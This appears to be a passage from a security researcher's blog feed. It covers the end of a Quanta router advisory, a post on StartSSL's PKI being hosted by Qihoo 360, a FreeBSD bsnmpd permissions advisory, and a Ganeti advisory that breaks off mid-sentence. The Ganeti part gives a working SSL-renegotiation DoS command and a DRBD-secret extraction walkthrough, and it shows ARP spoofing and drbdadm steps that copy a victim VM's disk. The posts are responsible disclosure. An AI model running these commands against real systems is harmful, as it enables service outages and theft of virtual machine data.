<p>You can recycle the router as a funny "light show" device with this command:</p>
<pre><code>root@homerouter:/sys/class/leds# for j in *; do (while sleep 0.1; do echo 0 &gt; /sys/class/leds/$j/brightness ; sleep 0.1 ; echo 1 &gt; /sys/class/leds/$j/brightness ;done &amp;); sleep 0.1;done
</code></pre>
<p>The leds will start blinking like crazy. It will add some fun in this long journey.</p>
<h2>Vendor Response</h2>
<p>The vulnerable router is in the End Of Service cycle and will not be
  supported anymore.</p>
<p>The vendor considers the router is still working well.</p>
<p>The vendor will consider security in their next product development.</p>
<h2>Report Timeline</h2>
<ul>
<li>Dec 04, 2015: Vulnerabilities found by Pierre Kim.</li>
<li>Mar 04, 2016: security@quantatw.com is contacted asking for a GPG key to exchange about vulnerabilities: email bounced.</li>
<li>Mar 04, 2016: Quanta is contacted about vulnerabilities in their routers and how to get a security contact at Quanta.</li>
<li>Mar 04, 2016: Quanta asks Pierre Kim about the affected device: model name, version and clear details about the vulnerabilities in order to redirect to the good IT department.</li>
<li>Mar 04, 2016: Pierre Kim specifies the model of the Router, asks for a GPG key in order to send detailed informations and clarifies he found backdoor accounts in the default firmware, allowing an unauthenticated, remote attacker to log in to the device with the privileges of the root user.</li>
<li>Mar 09, 2016: Pierre Kim contacts Quanta again to get a contact at the security team.</li>
<li>Mar 12, 2016: Pierre Kim contacts Quanta again to get a contact at the security team.</li>
<li>Mar 14, 2016: A Sale Account Manager at Quanta ("MIS department") asks if Pierre Kim gets the device from the Operator YooMee and says "The S/W is already fixed for our customer and we are not able to change it randomly for end customer. However, we appreciate your information and we will take into consideration for the s/w development in the near future."</li>
<li>Mar 14, 2016: Pierre Kim asks for clarification and asks if the device is End of Life and unsupported, even for security patches. Pierre Kims asks Quanta about clarification for the Vendor Response in the future public Security Advisory.</li>
<li>Mar 15, 2016: Quanta confirms the product is EOL and the released firmware was approved by the operator. Quanta can't modify of change without the customer's approval. Quanta does not have plan to patch or change FW as the product is EOL. Quanta thanks Pierre Kim for the information and will consider the findings into our next product development in the near future.</li>
<li>Mar 15, 2016: Pierre Kim asks if Quanta encourages users to discard the unsupported router for the "Vendor Response" in the advisory because no patch will be provided by the vendor.</li>
<li>Mar 16, 2016: Quanta considers the router is still working well but is in End Of Service cycle. Quanta doesn't encourage users to discard the router.</li>
<li>Mar 16, 2016: Pierre Kim adapts the Vendor Response accordingly but warns Quanta he is very concerned that no security workarounds are provided by the vendor.  At this time, Quanta never asked about the security vulnerabilities in detail, nor provided a GPG key.</li>
<li>Mar 18, 2016: Pierre Kim contacts again Quanta to ask if there is another reachable security team at Quanta. He asks again for a GPG key and demands Quanta to confirm no security patches are planned for the Quanta QDH Router.</li>
<li>Mar 21, 2016: Quanta confirms the product is EOL. Quanta asks details about the vulnerabilities.</li>
<li>Mar 22, 2016: Pierre Kim asks Quanta for a GPG key and states he will give a first draft without the exploits if Quanta is unable to provide a GPG key.</li>
<li>Mar 23, 2016: Quanta asks an advisory in cleartext without exploits.</li>
<li>Mar 23, 2016: Pierre Kim sends a draft to Quanta.</li>
<li>Apr 04, 2016: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2016-quanta-0x00.txt">https://pierrekim.github.io/advisories/2016-quanta-0x00.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Why I stopped using StartSSL (Hint it involves a Chinese company)</title>
        <link href="2016-02-16-why-i-stopped-using-startssl-because-of-qihoo-360.html"/>
        <content type="html"><h3>TL;DR: The PKI plateform of <a href="https://auth.startssl.com">StartSSL</a>, an Israeli leader of free SSL certificates, is now hosted by <a href="https://en.wikipedia.org/wiki/Qihoo_360">Qihoo 360</a>, a Chinese Antivirus Company, which uses IPs from a Chinese state-owned telecommunication company.</h3>
<p>StartSSL is PKI solution from StartCom, a company based in Israel. </p>
<p>From <a href="https://en.wikipedia.org/wiki/StartCom">https://en.wikipedia.org/wiki/StartCom</a>:</p>
<pre><code>StartSSL offers the free (for personal use) Class 1 X.509 SSL certificate "StartSSL Free", which works for webservers (SSL/TLS) as well as for E-mail encryption (S/MIME). It also offers Class 2 and 3 certificates as well as Extended Validation Certificates. All major browsers include support for StartSSL certificates.
</code></pre>
<h3>StartSSL announced in December 2015 that it will expand activities in China:</h3>
<p>From <a href="https://www.startssl.com/NewsDetailss">https://www.startssl.com/NewsDetails</a>:</p>
<pre><code>StartCom, a leading global Certificate Authority (CA) and provider of trusted identity and authentication services, launched its newly designed website just at the end of the year and announces expansion if its activities in China.
</code></pre>
<h2>Mapping of StartSSL public infrastructure</h2>
<p>StartSSL uses <a href="https://auth.startssl.com/">https://auth.startssl.com/</a> for the front-end to access to their PKIs (login to the PKI, create, revoke certificates...). It's the <strong>Core of their service</strong> and the critical part of their infrastructure.</p>
<p>Using Robtex, we discover the platform of StartSSL is mainly operated in Israel with the 192.116.242.0/24 IP range (netname: SrartCom-Ltd(sic!), with country: IL).</p>
<p>From  <a href="https://www.robtex.com/route/192.116.242.0-24.html">https://www.robtex.com/route/192.116.242.0-24.html</a>:</p>
<p><img alt="" src="images/startssl-192.116.242.0-24.png" /></p>
<p>The www.startssl.com vhost is provided by a custom CDN:</p>
<pre><code>root@kali:~/# host www.startssl.com
www.startssl.com has address 97.74.232.97    &lt;- Godaddy
www.startssl.com has address 52.7.55.170     &lt;- Amazon Web Services
www.startssl.com has address 52.21.57.183    &lt;- Amazon Web Services
www.startssl.com has address 52.0.114.134    &lt;- Amazon Web Services
www.startssl.com has address 50.62.56.98     &lt;- Godaddy
www.startssl.com has address 104.192.110.222 &lt;- QiHU 360 Inc.
www.startssl.com has address 50.62.133.237   &lt;- Godaddy
root@kali:~/#
</code></pre>
<p>Apart from IPs from CDNs, we find a strange fact:</p>
<p>The DNS of auth.startssl.com changed in December 2015 from <a href="https://apps.db.ripe.net/search/query.html?searchtext=192.116.242.27#resultsAnchor">192.116.242.27</a> (<strong>StrartCom-Ltd</strong>) to <a href="https://whois.arin.net/rest/net/NET-104-192-110-0-1/pft?s=104.192.110.222">104.192.110.222</a> (<strong>QiHU 360</strong>), which belongs to a Chinese Company (<strong>Qihoo 360</strong>).</p>
<p>There are only 3 vhosts pointing to 104.192.110.222 :</p>
<pre><code>www.startssl.com resolves for 1 IP to 104.192.110.222
auth.startssl.com -&gt; 104.192.110.222
www.startpki.com -&gt; 104.192.110.222
</code></pre>
<p>We can use <a href="https://www.whatsmydns.net/#A/auth.startssl.com">WhatsMyDNS</a> to check that auth.startssl.com revolves to 104.192.110.222 from any location. This is not a CDN solution but an intentional usage of a single Chinese IP.</p>
<p><img alt="https://www.whatsmydns.net/#A/auth.startssl.com" src="images/startssl-www.whatsmydns.net-auth.startssl.com.png" /></p>
<h2>Whois information for 104.192.110.222:</h2>
<p>From <a href="https://whois.arin.net/rest/net/NET-104-192-110-0-1/pft?s=104.192.110.222">https://whois.arin.net/rest/net/NET-104-192-110-0-1/pft?s=104.192.110.222</a>:</p>
<p><img alt="" src="images/startssl-ARIN-104.192.110.222.png" /></p>
<p><a href="https://www.whatsmydns.net/#A/auth.startssl.com">As auth.startssl.com revolves to 104.192.110.222 from any location</a>, we can assume the PKI is now hosted on the 104.192.110.222 IP.</p>
<p>104.192.110.222 is an IP from "QiHU 360 Inc", which actually means Qihoo 360. Qihoo 360 is a Chinese tech company.</p>
<p>You may be heard something about Qihoo 360, <a href="https://www.techinasia.com/chinese-tech-companies-bought-opera">who just bought Opera</a>.
Strangely enough, Qihoo 360 uses IPs from China Telecom Americas. China Telecom Americas is a subsidiary of China Telecom Corporation Limited which is a Chinese state-owned telecommunication company. It is the <a href="https://en.wikipedia.org/wiki/China_Telecom">largest fixed-line service and the third largest mobile telecommunication provider in the People's Republic of China</a>.</p>
<p>It is worrying that the PKI front-end (auth.startssl.com) is now hosted within a Chinese Antivirus Company, who uses a Chinese ISP for 2 months AND that there hasn't been any news around. It can be only linked to the expansion of StartSSL's activities in China in December 2015, as explained above.</p>
<p>From a history point of view, StartSSL <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=994033">already refused to revoke certificates affected by the HeartBleed vulnerability</a> and accused the user from negligence ("your software was vulnerable").</p>
<p>With all these facts, I don't think using StartSSL is a good idea now, except if they offer a clear explanation why they are hosting their PKI in a Chinese company.</p>
<p>Go use <a href="http://www.letsencrypt.org/">Let's encrypt</a> ! :)</p></content>
    </entry>
    
    <entry>
        <title>CVE-2015-5677 - FreeBSD bsnmpd information disclosure</title>
        <link href="2016-01-15-cve-2015-5677-freebsd-bsnmpd.html"/>
        <content type="html"><h2>Product Description</h2>
<p>The bsnmpd daemon serves the Internet SNMP (Simple Network Management
Protocol).  It is intended to serve only the absolute basic MIBs and
implement all other MIBs through loadable modules.</p>
<h2>Vulnerabilities Summary</h2>
<p>By default, the bsnmpd configuration file in FreeBSD 9.3 and 10.x has weak permissions
which allows a local user to retrieve sensitive information.</p>
<h2>Details</h2>
<p>By default the permissions of the bsnmpd configuration file are 0644 instead of 0600:</p>
<pre><code>root@freebsd-test-snmp:~ # ls -latr /etc/snmpd.config
-rw-r--r--  1 root  wheel  8662 Aug 12 16:27 /etc/snmpd.config
root@freebsd-test-snmp:~ #
</code></pre>
<p>This file is readable by a local user and contains the credentials for read-only and
read-write access (for SNMPv1, SNMPv2 and SNMPv3 protocols) and
gives a local user unnecessary/dangerous access:</p>
<pre><code>root@freebsd-test-snmp:~ # cat /etc/snmpd.config
[...]

# Change this!
read := "public"
# Uncomment begemotSnmpdCommunityString.0.2 below that sets the community
# string to enable write access.
write := "geheim"
trap := "mytrap"

[...]

# SNMPv3 USM User definition
#
# [...]
#
#user1 := "bsnmp"
#user1passwd := 0x22:0x98:0x1a:0x6e:0x39:0x93:0x16:0x5e:0x6a:0x21:0x1b:0xd8:0xa9:0x81:0x31:0x05:0x16:0x33:0x38:0x60

[...]
</code></pre>
<h2>Vendor Response</h2>
<p>The official patch does not fix the permissions for existing installations.</p>
<p>This vulnerability can be fixed by modifying the permission on
/etc/bsnmpd.conf to owner root:wheel and permission 0600.</p>
<h2>Report Timeline</h2>
<ul>
<li>Nov 04, 2015: Vulnerability found by Pierre Kim.</li>
<li>Nov 05, 2015: security-officer@freebsd.org is notified of the vulnerability.</li>
<li>Nov 07, 2015: security-officer@freebsd.org confirms the vulnerability but the patch in existing installations does not seem to be feasible.</li>
<li>Nov 11, 2015: Pierre Kim asks security-officer@freebsd.org for a CVE number, using FreeBSD CVE pool for future FreeBSD vulnerabilities.</li>
<li>Nov 11, 2015: security-officer@freebsd.org assigns CVE-2015-5677.</li>
<li>Jan 05, 2016: Pierre Kim asks the status of the vulnerability.</li>
<li>Jan 13, 2016: Pierre Kim states he will release a security advisory the Feb 05, 2016 after a 3-month embargo.</li>
<li>Jan 13, 2016: security-officer@freebsd.org confirms a security advisory will be issued on Jan 19, 2016.</li>
<li>Jan 14, 2016: An official advisory is published by FreeBSD.</li>
<li>Jan 15, 2016: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>This vulnerability was found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/CVE-2015-5677-freebsd-bsnmpd.txt">https://pierrekim.github.io/advisories/CVE-2015-5677-freebsd-bsnmpd.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2016-01-15-cve-2015-5677-freebsd-bsnmpd.html">https://pierrekim.github.io/blog/2016-01-15-cve-2015-5677-freebsd-bsnmpd.html</a></p>
<p><a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-16:06.bsnmpd.asc">https://www.freebsd.org/security/advisories/FreeBSD-SA-16:06.bsnmpd.asc</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>CVE-2015-7944, CVE-2015-7945 - Ganeti Security Advisory (DoS, Unauthenticated Info Leak)</title>
        <link href="2016-01-05-Ganeti-Info-Leak-DoS.html"/>
        <content type="html"><h2>Product Description</h2>
<p><a href="https://code.google.com/p/ganeti/">Ganeti</a> is a virtual machine cluster management tool developed by Google.</p>
<p>The solution stack uses either Xen or KVM as the virtualization platform, LVM for disk management,
and optionally DRBD for disk replication across physical hosts.</p>
<h2>Vulnerabilities Summary</h2>
<p>Ganeti has security problems in the default install (with DRBD) and the default configuration due to old libraries and design problem,
even if the security level in Ganeti seems to be high.</p>
<p>These problems affect every versions until the last released version.</p>
<p>The Ganeti API Daemon is open on every interface by default and an attacker can DoS this daemon.</p>
<p>It is also possible to abuse this deamon to retrieve information, such as network topology, DRBD secrets...</p>
<p><strong>A PoC is provided to automaticaly retrieve sensitive information and a possible scenario, allowing to take over Virtual Machines remotely, is provided (which worked in my lab in certain conditions)</strong>.</p>
<h2>Details - CVE-2015-7944 - Unauthenticated Remote DoS</h2>
<p>Ganeti is prone to a SSL DoS with SSL renegociation against the RAPI Daemon:</p>
<pre><code>user@kali:~$ (sleep 1; while true;do echo R;done) | openssl s_client -connect 10.105.1.200:5080
CONNECTED(00000003)
depth=0 CN = ganeti.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = ganeti.example.com
verify return:1
---
Certificate chain
 0 s:/CN=ganeti.example.com
   i:/CN=ganeti.example.com
---
Server certificate
-----BEGIN CERTIFICATE-----
[...]
-----END CERTIFICATE-----
subject=/CN=ganeti.example.com
issuer=/CN=ganeti.example.com
---
No client certificate CA names sent
---
SSL handshake has read 1003 bytes and written 625 bytes
---
New, TLSv1/SSLv3, Cipher is AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : AES256-GCM-SHA384
    Session-ID: D75BCF369143CD008D693B022B967149AF0BD420DE385C51227A1921CD29360D
    Session-ID-ctx: 
    Master-Key: 7DDD57FD479AE6555D1D42CF2B15B8857C28430189EC5C1331C75C4253E4A9F0FC0672EE2F2438CD055328C5A46C4F5F
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 10 ad 69 39 76 6c 2e 37-cf e7 c2 2c 5f f0 e0 20   ..i9vl.7...,_.. 
    0010 - 5d 85 5a 79 82 20 6a 1d-f1 6e 51 f5 f2 f7 c6 cf   ].Zy. j..nQ.....
    0020 - c1 85 2d 42 5a 1c 53 b4-cb db de 65 04 2a 02 da   ..-BZ.S....e.*..
    0030 - 5c 7d 82 ef 56 4a a4 a1-88 bd 87 fd af 25 e3 2e   \}..VJ.......%..
    0040 - 28 68 04 a4 01 22 88 72-30 0b 79 1c 75 61 88 d5   (h...".r0.y.ua..
    0050 - c9 f3 e2 0b 02 50 bf c8-29 ac d9 36 f3 76 bd 8b   .....P..)..6.v..
    0060 - 05 e0 d3 a9 f3 8b 8b 11-ef 19 2f 94 92 30 94 58   ........../..0.X
    0070 - aa 64 ba 3f a4 fc 15 4b-74 11 3b c3 c7 e7 d4 33   .d.?...Kt.;....3
    0080 - dd 76 e9 e1 1b 3a 95 c4-50 28 4f 9e bc cc cb f3   .v...:..P(O.....
    0090 - bf 4d 60 92 64 00 af 67-c0 e9 69 e3 98 54 21 dc   .M`.d..g..i..T!.

    Start Time: 1138121399
    Timeout   : 300 (sec)
    Verify return code: 18 (self signed certificate)
---
RENEGOTIATING
depth=0 CN = ganeti.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = ganeti.example.com
verify return:1
RENEGOTIATING
depth=0 CN = ganeti.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = ganeti.example.com
verify return:1
RENEGOTIATING
depth=0 CN = ganeti.example.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = ganeti.example.com
verify return:1
RENEGOTIATING
[...]
</code></pre>
<p>From my test, 1 thread takes 75% of CPU.</p>
<p><code>top</code> on the main server (10.105.1.200):</p>
<pre><code>19734 gnt-rapi  20   0  148980  35364   4696 R  76.8  3.7   0:04.12 ganeti-rapi
</code></pre>
<p>Multiple threads will eat all the available CPUs and will likely DoS ganeti:</p>
<pre><code>21280 gnt-rapi  20   0  148980  35364   4696 R  35.3  3.7   0:05.06 ganeti-rapi
20968 gnt-rapi  20   0  148980  35364   4696 R  33.4  3.7   0:09.92 ganeti-rapi
20969 gnt-rapi  20   0  148980  35364   4696 R  32.4  3.7   0:09.95 ganeti-rapi
21282 gnt-rapi  20   0  148980  35364   4696 R  32.4  3.7   0:04.53 ganeti-rapi
21281 gnt-rapi  20   0  148980  35364   4696 R  31.4  3.7   0:04.78 ganeti-rapi
</code></pre>
<p>An attacker can use tools from THC to perform SSL DoS too (openssl was the fastest solution out of the box): <a href="https://www.thc.org/thc-ssl-dos/">https://www.thc.org/thc-ssl-dos/</a>.</p>
<h2>Details - CVE-2015-7945 - Unauthenticated Remote Information Disclosure</h2>
<p>This vulnerability allows an attacker to retrieve data using information disclosure,
allowing him, depending on the configuration, to remotely hack VMs.
A PoC (<a href="https://pierrekim.github.io/advisories/GHETTO-BLASTER">GHETTO-BLASTER</a> which works in Linux (Debian, Kali) and FreeBSD) is available here: <a href="https://pierrekim.github.io/advisories/GHETTO-BLASTER">https://pierrekim.github.io/advisories/GHETTO-BLASTER</a>.</p>
<p><strong>I. Design Security Problem with the RAPI Daemon</strong></p>
<p>In the Ganeti master node, when using <code>/usr/sbin/gnt-network</code>, a non-root user can't get information (debian-01 is the ganeti master node):</p>
<pre><code>user@debian-01:~$ /usr/sbin/gnt-network list
It seems you don't have permissions to connect to the master daemon.
Please retry as a different user.
user@debian-01:~$
</code></pre>
<p>This is common for all <code>gnt-tools</code> and seems to be a security design.</p>
<p>It appears Genati by default is too open when using the RAPI daemon and this daemon listens on every interface by default.</p>
<p>For example, the network configuration can be extracted from jobs using the RAPI daemon without authentication.</p>
<p>I wrote a tool, "GHETTO-BLASTER", to industrialize the process:</p>
<pre><code>user@kali:~$ ./GHETTO-BLASTER http://&lt;ip_of_ganeti_rapi&gt;

Example:
  https://&lt;ip&gt;

2015 Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;
     @PierreKimSec https://pierrekim.github.io
DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE &lt;http://www.wtfpl.net/txt/copying/&gt;
user@kali:~$ ./GHETTO-BLASTER http://10.105.1.200
[...]
[a lot of output]
[...]
user@kali:~$ ls -l 2-networks  2-networks-test-priv 2-networks-test-pub
-rw-r--r-- 1 user user 228 Jun 20 13:37 2-networks
-rw-r--r-- 1 user user 882 Jun 20 13:37 2-networks-test-priv
-rw-r--r-- 1 user user 881 Jun 20 13:37 2-networks-test-pub
user@kali:~$ cat 2-networks  2-networks-test-priv 2-networks-test-pub
$VAR1 = [
          {
            'name' =&gt; 'test-priv',
            'uri' =&gt; '/2/networks/test-priv'
          },
          {
            'uri' =&gt; '/2/networks/test-pub',
            'name' =&gt; 'test-pub'
          }
        ];
$VAR1 = {
          'mtime' =&gt; '1313027652.67126',
          'gateway' =&gt; undef,
          'network6' =&gt; undef,
          'inst_list' =&gt; [],
          'mac_prefix' =&gt; undef,
          'serial_no' =&gt; 1,
          'free_count' =&gt; 254,
          'name' =&gt; 'test-priv',
          'map' =&gt; 'X..............................................................................................................................................................................................................................................................X',
          'gateway6' =&gt; undef,
          'external_reservations' =&gt; '192.168.1.0, 192.168.1.255',
          'uuid' =&gt; '506ad97b-2276-43f4-ae27-e6bbb97f28ff',
          'ctime' =&gt; '1133027652.67126',
          'reserved_count' =&gt; 2,
          'network' =&gt; '192.168.1.0/24',
          'group_list' =&gt; [],
          'tags' =&gt; []
        };
$VAR1 = {
          'mac_prefix' =&gt; undef,
          'inst_list' =&gt; [],
          'network6' =&gt; undef,
          'mtime' =&gt; '1333027641.64375',
          'gateway' =&gt; undef,
          'map' =&gt; 'X..............................................................................................................................................................................................................................................................X',
          'free_count' =&gt; 254,
          'name' =&gt; 'test-pub',
          'serial_no' =&gt; 1,
          'reserved_count' =&gt; 2,
          'network' =&gt; '192.168.0.0/24',
          'ctime' =&gt; '1133027641.64375',
          'gateway6' =&gt; undef,
          'uuid' =&gt; '48b34199-2d23-46f0-b4aa-2539cb4a7780',
          'external_reservations' =&gt; '192.168.0.0, 192.168.0.255',
          'group_list' =&gt; [],
          'tags' =&gt; []
        };
user@kali:~$
</code></pre>
<p>It's possible to map the network and to retrieve sensible secrets.</p>
<p>Other interesting information:</p>
<p><code>osparams_secret</code> is readable in jobs using the access to RAPI.</p>
<p><strong>II. Using this information disclosure to hack VMs</strong></p>
<p>By default, <code>/var/lib/ganeti/config.data</code>(640, gnt-masterd:gnt-confd) contains the secret key for DRBD replication.</p>
<p>A remote user or even a local non-root (or non gnt-masterd user) can't get the configuration of DRBD.</p>
<p>This key can be extracted from jobs by abusing the RAPI daemon without authentication.</p>
<p>After running GHETTO-BLASTER, you will have a lot of files:</p>
<pre><code>user@kali:~$ ls
1-list-collectors      2-jobs-121  2-jobs-154  2-jobs-187  2-jobs-219  2-jobs-251  2-jobs-284  2-jobs-47  2-jobs-8
1-report-all           2-jobs-122  2-jobs-155  2-jobs-188  2-jobs-22   2-jobs-252  2-jobs-285  2-jobs-48  2-jobs-80
2-features             2-jobs-123  2-jobs-156  2-jobs-189  2-jobs-220  2-jobs-253  2-jobs-286  2-jobs-49  2-jobs-81
2-info                 2-jobs-124  2-jobs-157  2-jobs-19   2-jobs-221  2-jobs-254  2-jobs-287  2-jobs-5   2-jobs-82
2-instances            2-jobs-125  2-jobs-158  2-jobs-190  2-jobs-222  2-jobs-255  2-jobs-288  2-jobs-50  2-jobs-83
2-instances-vm-01      2-jobs-126  2-jobs-159  2-jobs-191  2-jobs-223  2-jobs-256  2-jobs-289  2-jobs-51  2-jobs-84
2-instances-vm-01-jobs 2-jobs-127  2-jobs-16   2-jobs-192  2-jobs-224  2-jobs-257  2-jobs-29   2-jobs-52  2-jobs-85
2-instances-vm-02      2-jobs-128  2-jobs-160  2-jobs-193  2-jobs-225  2-jobs-258  2-jobs-290  2-jobs-53  2-jobs-86
2-instances-vm-02-jobs 2-jobs-129  2-jobs-161  2-jobs-194  2-jobs-226  2-jobs-259  2-jobs-291  2-jobs-54  2-jobs-87
[...]
2-jobs-109             2-jobs-141  2-jobs-174  2-jobs-206  2-jobs-239  2-jobs-271  2-jobs-34   2-jobs-67  2-networks
2-jobs-11              2-jobs-142  2-jobs-175  2-jobs-207  2-jobs-24   2-jobs-272  2-jobs-35   2-jobs-68  2-nodes
2-jobs-110             2-jobs-143  2-jobs-176  2-jobs-208  2-jobs-240  2-jobs-273  2-jobs-36   2-jobs-69  2-nodes-debian-01
2-jobs-111             2-jobs-144  2-jobs-177  2-jobs-209  2-jobs-241  2-jobs-274  2-jobs-37   2-jobs-7   2-nodes-debian-01-role
2-jobs-112             2-jobs-145  2-jobs-178  2-jobs-21   2-jobs-242  2-jobs-275  2-jobs-38   2-jobs-70  2-nodes-debian-02
2-jobs-113             2-jobs-146  2-jobs-179  2-jobs-210  2-jobs-243  2-jobs-276  2-jobs-39   2-jobs-71  2-nodes-debian-02-role
2-jobs-114             2-jobs-147  2-jobs-18   2-jobs-211  2-jobs-244  2-jobs-277  2-jobs-4    2-jobs-72  2-os
2-jobs-115             2-jobs-148  2-jobs-180  2-jobs-212  2-jobs-245  2-jobs-278  2-jobs-40   2-jobs-73  version
2-jobs-116             2-jobs-149  2-jobs-181  2-jobs-213  2-jobs-246  2-jobs-279  2-jobs-41   2-jobs-74
2-jobs-117             2-jobs-15   2-jobs-182  2-jobs-214  2-jobs-247  2-jobs-28   2-jobs-42   2-jobs-75
2-jobs-118             2-jobs-150  2-jobs-183  2-jobs-215  2-jobs-248  2-jobs-280  2-jobs-43   2-jobs-76
2-jobs-119             2-jobs-151  2-jobs-184  2-jobs-216  2-jobs-249  2-jobs-281  2-jobs-44   2-jobs-77
2-jobs-12              2-jobs-152  2-jobs-185  2-jobs-217  2-jobs-25   2-jobs-282  2-jobs-45   2-jobs-78
2-jobs-120             2-jobs-153  2-jobs-186  2-jobs-218  2-jobs-250  2-jobs-283  2-jobs-46   2-jobs-79
</code></pre>
<p>Files contain DRBD secrets:</p>
<pre><code>user@kali:~$ grep secret *|tail -n 5
2-jobs-80:                                        'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06'
2-jobs-82:                            'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06'
2-jobs-84:                            'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
2-jobs-85:                            'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
2-jobs-86:                            'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
user@kali:~$
</code></pre>
<p>The key is confirmed by using <code>drbdsetup show</code> as root in the Ganeti master node:</p>
<pre><code>root@debian-01:~# drbdsetup show
resource resource0 {
    options {
    }
    net {
        cram-hmac-alg           "md5";
        shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
        after-sb-0pri           discard-zero-changes;
        after-sb-1pri           consensus;
    }
    _remote_host {
        address                 ipv4 10.105.1.201:11000;
    }
    _this_host {
        address                 ipv4 10.105.1.200:11000;
        volume 0 {
            device                      minor 0;
            disk                        "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
            meta-disk                   "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
            disk {
                size                    8388608s; # bytes
                resync-rate             61440k; # bytes/second
            }
       }
    }
}
root@debian-01:~#
</code></pre>
<p>By digging more, one of the jobs file (2-jobs-280) contains the DRDB configuration:</p>
<pre><code>[...]
  'drbd_info' =&gt; {
                   'port' =&gt; 11000,
                   'primary_minor' =&gt; 0,
                   'secondary_node' =&gt; 'debian-02',
                   'secondary_minor' =&gt; 0,
                   'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
                   'primary_node' =&gt; 'debian-01'
                 },
[...]
</code></pre>
<p>As stated in <a href="http://docs.ganeti.org/ganeti/current/html/security.html">http://docs.ganeti.org/ganeti/current/html/security.html</a>:</p>
<pre><code>DRBD connections are protected from erroneous connections to other machines (as may happen due
to software issues), and from accepting connections from other machines, by using a shared secret,
exchanged via RPC requests from the master to the nodes when configuring the device.
</code></pre>
<p>We recovered the secret of DRBD, the port used and the nodes without authentication.
Other files contain the LVM VG and the LVM LG names! It's enough to start playing with DRDB from an attacker side.</p>
<p><strong>III. DRBD Madness</strong></p>
<p>Now, it's time for DRBD Feng Shui!</p>
<p>Getting the File System of a VM:</p>
<p>o By doing ARP spoofing in the same LAN:</p>
<p>We will impersonate 10.105.1.201 by doing ARP poisoning and using a valid drbd.conf thank to the parameters provided by the RAPI daemon:</p>
<pre><code>root@kali# cat etc-drbd.conf

include "drbd.d/global_common.conf";
include "drbd.d/*.res";

resource resource0 {
    volume 0 {
       device minor 0;
       disk                        "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
       meta-disk                   "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
    }
    protocol C;
    net {
        cram-hmac-alg           "md5";
        shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
        after-sb-0pri           discard-zero-changes;
        after-sb-1pri           consensus;
    }
    on target {
        address    10.105.1.200:11000;
    }
    on kali {
        address    10.105.1.201:11000;
    }
}


root@kali# vgremove xenvg-vg 2&gt;/dev/null
root@kali# dd if=/dev/zero of=/dev/sdb bs=1024 count=1024
root@kali# pvcreate /dev/sdb
root@kali# vgcreate xenvg-vg /dev/sdb
root@kali# lvcreate --name 41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data --size 4G xenvg-vg
root@kali# lvcreate --name 41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta --size 128M xenvg-vg
root@kali# cp etc-drbd.conf /etc/drbd.conf
root@kali# drbdadm create-md resource0
root@kali# drbdadm up resource0

&lt;ARP poisoning&gt; || root@kali# ifconfig eth0 10.105.1.201 netmask 255.255.255.0

root@kali# drbdadm attach resource0
root@kali# drbdadm connect resource0
root@kali# cat /proc/drbd
version: 8.4.3 (api:1/proto:86-101)
srcversion: 1A9F77B1CA5FF92235C2213 
 0: cs:SyncTarget ro:Secondary/Primary ds:Inconsistent/UpToDate C r-----
    ns:0 nr:916568 dw:916472 dr:0 al:0 bm:55 lo:2 pe:0 ua:2 ap:0 ep:1 wo:f oos:3277832
        [===&gt;................] sync'ed: 22.0% (3277832/4194304)K
        finish: 0:08:33 speed: 6,368 (5,912) want: 4,520 K/sec
root@kali# echo "wow synchronisation in progress !"
wow synchronisation in progress !
root@kali#
</code></pre>
<p>After 10min of synchronisation, an attacker will have a perfect copy of the targeted VM File System using DRDB replication.</p>
<p>It's also possible to write information in the File System (like adding SSH keys).
